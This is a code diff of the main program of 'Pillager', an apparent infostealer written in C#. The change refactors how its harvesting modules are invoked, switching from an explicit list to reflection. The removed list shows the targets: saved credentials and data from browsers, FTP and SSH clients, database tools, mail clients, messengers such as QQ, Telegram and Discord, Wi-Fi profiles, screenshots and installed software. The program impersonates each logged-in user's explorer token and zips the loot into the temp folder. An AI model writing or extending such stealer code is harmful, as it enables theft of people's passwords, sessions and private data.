@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
+using System.Reflection;
 using Pillager.Browsers;
 using Pillager.FTPs;
 using Pillager.Helper;
@@ -14,10 +15,12 @@ namespace Pillager
 {
     internal class Program
     {
+        static string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
+        static string logpath = Path.Combine(savepath, "Pillager.log");
+        static string savezippath = savepath + ".zip";
+        [STAThread]
         static void Main(string[] args)
         {
-            string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
-            string savezippath = savepath + ".zip";
             if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
             if (File.Exists(savezippath)) File.Delete(savezippath);
             Directory.CreateDirectory(savepath);
@@ -28,7 +31,7 @@ namespace Pillager
                 {
                     if (p.ProcessName.ToLower() == "explorer" && Methods.ImpersonateProcessToken(p.Id))
                     {
-                        string usersavepath = Path.Combine(savepath, Methods.GetProcessUserName(p.Id));
+                        string usersavepath = Path.Combine(savepath, Methods.GetProcessUserName(p));
                         Directory.CreateDirectory(usersavepath);
                         SaveAll(usersavepath);
                         Native.RevertToSelf();
@@ -40,65 +43,49 @@ namespace Pillager
                 SaveAll(savepath);
             }
 
-            //Zip
-            ZipStorer zip = ZipStorer.Create(savezippath);
-            foreach (var item in Directory.GetDirectories(savepath))
-                zip.AddDirectory(ZipStorer.Compression.Deflate, item, "");
-            foreach (var item in Directory.GetFiles(savepath))
-                zip.AddFile(ZipStorer.Compression.Deflate, item, Path.GetFileName(item));
-            zip.Close();
+            SaveAllOnce(savepath);
 
+            //Zip
+            using (ZipStorer zip = ZipStorer.Create(savezippath))
+            {
+                foreach (var item in Directory.GetDirectories(savepath))
+                    zip.AddDirectory(ZipStorer.Compression.Deflate, item, "");
+                foreach (var item in Directory.GetFiles(savepath))
+                    zip.AddFile(ZipStorer.Compression.Deflate, item, Path.GetFileName(item));
+            }
             Directory.Delete(savepath, true);
         }
 
         static void SaveAll(string savepath)
         {
-            //Browsers
-            IE.Save(savepath);
-            OldSogou.Save(savepath);//SogouExplorer < 12.x
-            Chrome.Save(savepath);
-            FireFox.Save(savepath);
+            var self = Assembly.GetExecutingAssembly();
 
-            //FTP
-            WinSCP.Save(savepath);
-            FileZilla.Save(savepath);
-            CoreFTP.Save(savepath);
-            Snowflake.Save(savepath);
+            foreach (var type in self.GetTypes())
+            {
+                if (type.IsSubclassOf(typeof(ICommand)))
+                {
+                    File.AppendAllText(logpath, "Try to save "+type.Name +" to "+ savepath+". ");
+                    var instance = (ICommand)Activator.CreateInstance(type);
+                    instance.Save(savepath);
+                    File.AppendAllText(logpath, "Finished!" + Environment.NewLine);
+                }
+            }
+        }
 
-            //Tools
-            MobaXterm.Save(savepath);
-            Xmanager.Save(savepath);
-            Navicat.Save(savepath);
-            RDCMan.Save(savepath);
-            FinalShell.Save(savepath);
-            SQLyog.Save(savepath);
-            DBeaver.Save(savepath);
-            TortoiseSVN.Save(savepath);
-            SecureCRT.Save(savepath);
+        static void SaveAllOnce(string savepath)
+        {
+            var self = Assembly.GetExecutingAssembly();
 
-            //Softwares
-            VSCode.Save(savepath);
-            NeteaseCloudMusic.Save(savepath);
-
-            //Mail
-            MailMaster.Save(savepath);
-            Foxmail.Save(savepath);
-            Outlook.Save(savepath);
-            MailBird.Save(savepath);
-
-            //Messengers
-            QQ.Save(savepath);
-            Telegram.Save(savepath);
-            Skype.Save(savepath);
-            Enigma.Save(savepath);
-            DingTalk.Save(savepath);
-            Line.Save(savepath);
-            Discord.Save(savepath);
-
-            //SystemInfos
-            Wifi.Save(savepath);
-            ScreenShot.Save(savepath);
-            InstalledApp.Save(savepath);
+            foreach (var type in self.GetTypes())
+            {
+                if (type.IsSubclassOf(typeof(ICommandOnce)))
+                {
+                    File.AppendAllText(logpath, "Try to save " + type.Name + " to " + savepath + ". ");
+                    var instance = (ICommandOnce)Activator.CreateInstance(type);
+                    instance.Save(savepath);
+                    File.AppendAllText(logpath, "Finished!" + Environment.NewLine);
+                }
+            }
         }
     }
 }
